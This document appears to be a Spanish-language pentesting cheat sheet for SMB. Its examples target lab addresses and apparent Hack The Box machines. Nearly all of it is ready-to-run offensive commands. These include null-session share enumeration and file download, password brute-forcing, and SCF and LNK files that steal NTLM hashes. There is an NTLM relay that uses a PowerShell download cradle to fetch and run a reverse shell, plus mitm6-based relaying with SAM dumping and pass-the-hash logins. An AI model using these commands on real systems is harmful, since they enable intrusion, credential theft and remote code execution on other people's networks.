
### ENUMERACIÓN BÁSICA
```shell
❯ crackmapexec smb 10.10.10.74
```


### VERIFICAR USUARIOS VALIDOS
```shell
❯ crackmapexec smb 10.10.11.241 -u 'drwilliams' -p 'qwe123!@#'
```


# RECURSOS COMPARTIDOS
### NULL SESSION
```shell
❯ crackmapexec smb 10.10.10.4 --shares -u '' -p ''

❯ smbclient -N -L \\\\10.10.10.125

❯ smbclient -N -L //10.10.10.134

❯ smbmap -H 10.10.11.129 --no-banner
```


### ACCEDER A CARPETA
```shell
❯ smbmap -H 10.10.10.172 -u 'NULLSESSION' -r 'users/' --no-banner
```


### DESCARGAR ARCHIVO
```shell
#SIN CREDENCIALES
❯ smbmap -H 10.10.10.172 -u '' -N --download 'users/mhope/azure.xml' --no-banner

#CON CREDENCIALES
❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users/mhope/azure.xml' --no-banner
``` 


### CON CREDENCIALES
```shell
❯ crackmapexec smb 10.10.11.241 -u 'drwilliams' -p 'qwe123!@#' --shares

❯ smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope' --no-banner
```

### MONTURA DE RECURSOS COMPARTIDOS
```shell
#SIN CREDENCIALES
❯ sudo mkdir /mnt/montura
❯ sudo mount -t cifs "//10.10.10.103/Department Shares" /mnt/montura

#CON CREDENCIALES
❯ sudo mount -t cifs "//10.10.11.41/SYSVOL" /mnt/montura -o username=judith.mader,password=judith09
```


### SUBIR ARCHIVO A RECURSO COMPARTIDO
```shell
❯ smbclient //10.10.10.97/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'
smb: \> put file.php
```


### CONSOLA INTERACTIVA
```shell
#CON CREDENCIALES
❯ smbclient //10.10.10.97/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&'

# CON UN NULL SESSION
❯ smbclient "//10.10.10.103/Department Shares" -N

#DESACTIVAR EL PROMPT
prompt OFF
```


### PRIVILEGIOS

---
**LISTAR PRIVILEGIOS POR SMBCACLS**
```shell
❯ smbcacls "//10.10.10.103/Department Shares" Users/Amanda -N #LE INDICAMOS EL DIRECTORIO DESPUES DE LAS ""
```


# ESCRITURA Y LECTURA
### .SCF
```shell
#EN NUESTRA MÁQUINA
❯ sudo impacket-smbserver smbFolder $(pwd) -smb2support
#EN LA MONTURA DEL RECURSO COMPARTIDO
❯ sudo nano test.scf
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop 
```

### .lnk
```shell
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py -g lnk -s 192.168.45.227 -f vault #PONEMOS NUESTRA IP
sudo responder -I tun0
sudo cp vault/vault.lnk /mnt/montura
```

---
# BRUTE FORCE
### CREDENCIALES PARALELAS
```shell
❯ crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-succes --no-bruteforce

❯ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```


### USUARIOS LOCALES
```SHELL
crackmapexec smb 192.168.212.96 -u ./m/M3/users -p 'Reality2Show4!.?' --continue-on-succes --local-auth
```

### PARAMETROS
```shell
#CON USUARIO
❯ crackmapexec smb 10.10.10.172 -u 'user' -p pass.txt --continue-on-success

#CON CONTRASEÑA
❯ crackmapexec smb 10.10.10.172 -u user.txt -p 'PASS' --continue-on-success
```

### SIN USUARIO NI CONTRASEÑA
```shell
❯ crackmapexec smb 10.10.10.172 -u user.txt -p pass.txt --continue-on-success
```

### CONECTARSE CON WMIEXEC
```shell
❯ wmiexec.py search.htb/tristan.davies@10.10.11.129
```

### IDENTIFICAR SI ES VULNERABLE
```SHELL
❯ nmap --script "smb-vuln-ms17-010" -p445 10.10.10.74

❯ nmap --script "smb-vuln-ms17-010" -p445 10.10.10.40

❯ nmap --script "vuln and safe" -p445 10.10.10.40
```


# SAMBA RELAY
### IPv4
```shell
❯ python3 Responder.py -I eth0 -rdw
```

### REV SHELL
```shell
❯ wget "https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1"
	AÑADIR A LA ÚLTIMA LINEA ==> Invoke-PowerShellTcp -Reverse -IPAddress LHOST -Port LPORT  ==> AÑADIR NUESTRO LHOTS Y LPORT

❯ python3 -m http.server 8000
❯ sudo rlwrap nc -nlvp 4646

❯ python3 Responder.py -I eth0 -rdw
❯ ntlmrelayx.py -tf tartets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://0.0.0.0:8000/Invoke-PowerShellTcp.ps1')"

❯ sudo rlwrap nc -nlvp 4646
(PWNED)
```

# IPv6
### CONFIGURACIONES
```shell
Responder.conf{
	SMB,HTTP  ==> OFF
}

targets.txt{
	IP VICTIMA
}

❯ python3 Responder.py -I eth0 -rdw
❯ ntlmrelayx.py -tf tartets.txt -smb2support
```

### REVERSE SHELL
```shell
❯ mitm6 -d savicorp.local

❯ ntlrelayx -6 -wh [IP ATACANTE] -t smb://[IP VICTIMA] -socks -debug -smb2support
ntlmrelayx> socks
		[PODEMOS VER USUARIOS QUE HAN CAIDO]

❯ proxychains cme smb [IP VICTIMA] -u 'USER' -p 'RANDOM-PASSWORD' -d 'DOMAIN' [DEBERIAMOS DE VER UN PWNED]

❯ proxychains cme smb [IP VICTIMA] -u 'USER' -p 'RANDOM-PASSWORD' -d 'DOMAIN' --sam
		[DUMP SAM]
```

# RID BRUTE
```shell
❯ crackmapexec smb 10.10.11.263 -u 'Guest' -p '' --rid-brute

❯ impacket-lookupsid anonymous@manager.htb -no-pass
```


# HASH
### SMB
```shell
❯ crackmapexec smb 10.10.10.192 -u 'management_svc' -H '5d954b0ade32279532e34ae1bd138889'
```

### WINRM
```shell
❯ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```